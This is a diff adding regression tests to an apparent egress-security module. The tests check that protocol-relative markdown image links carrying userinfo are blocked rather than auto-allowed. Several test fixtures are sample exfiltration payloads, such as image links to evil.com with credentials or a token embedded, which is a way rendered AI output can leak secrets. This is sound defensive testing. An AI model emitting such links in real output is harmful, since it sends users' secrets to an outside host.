@@ -274,6 +274,67 @@ test("R3-1: an empty query parameter name fails closed", () => {
   expect(action).toBeUndefined();
 });
 
+// R3V-1 (flow 304, fix round 3, review round 3): `queryIsSafeForTrustedOverride`
+// used to parse userinfo with a bare `new URL(renderable)`, which throws for
+// any relative destination — including a PROTOCOL-RELATIVE one, which a
+// renderer fetches exactly like an absolute URL and which DOES carry userinfo
+// — and the catch treated that throw as "no userinfo is possible", so
+// `//user:pass@evil.com/a.png` read as query-free and fell through to
+// `allow`. The fix resolves against a fixed dummy base instead, which exposes
+// userinfo on a protocol-relative destination the same way a browser would.
+test("R3V-1: protocol-relative URL with userinfo fails closed (//user:pass@host)", () => {
+  const content = `![b](//user:pass@evil.com/a.png)`;
+  const match = exfilMatch(content);
+  const action = egressSourceOverrideAction(
+    DEFAULT_SECURITY_CONFIG.policies.egress,
+    match,
+    "trusted-project",
+  );
+  expect(action).toBeUndefined();
+});
+
+test("R3V-1: protocol-relative URL with a bare username fails closed (//token@host)", () => {
+  const content = `![b](//token@evil.com/a.png)`;
+  const match = exfilMatch(content);
+  const action = egressSourceOverrideAction(
+    DEFAULT_SECURITY_CONFIG.policies.egress,
+    match,
+    "trusted-project",
+  );
+  expect(action).toBeUndefined();
+});
+
+test("R3V-1: protocol-relative URL with an empty username, non-empty password fails closed (//:pass@host)", () => {
+  const content = `![b](//:pass@evil.com/a.png)`;
+  const match = exfilMatch(content);
+  const action = egressSourceOverrideAction(
+    DEFAULT_SECURITY_CONFIG.policies.egress,
+    match,
+    "trusted-project",
+  );
+  expect(action).toBeUndefined();
+});
+
+test("R3V-1: protocol-relative badge URL with no userinfo still allows (//img.shields.io/badge/x.svg?style=flat)", () => {
+  const content = `![b](//img.shields.io/badge/x.svg?style=flat)`;
+  const match = exfilMatch(content);
+  const action = egressSourceOverrideAction(
+    DEFAULT_SECURITY_CONFIG.policies.egress,
+    match,
+    "trusted-project",
+  );
+  expect(action).toBe("allow");
+});
+
+// A relative destination (no host of its own, so `detectExfil` never even
+// produces a match for it) must stay unaffected by resolving against the
+// dummy base: it has no userinfo to carry either way.
+test("R3V-1: a relative destination is unaffected (./docs/logo.png)", () => {
+  const content = `![b](./docs/logo.png)`;
+  const matches = detectExfil(content);
+  expect(matches).toHaveLength(0);
+});
+
 test("mergeSecurityConfig: the shipped default is NOT materialized into policies.egress.sourceOverrides (F1)", () => {
   // F1 (review round 1): the shipped default used to be copied into every
   // merged config's `policies.egress.sourceOverrides`, which is exactly the
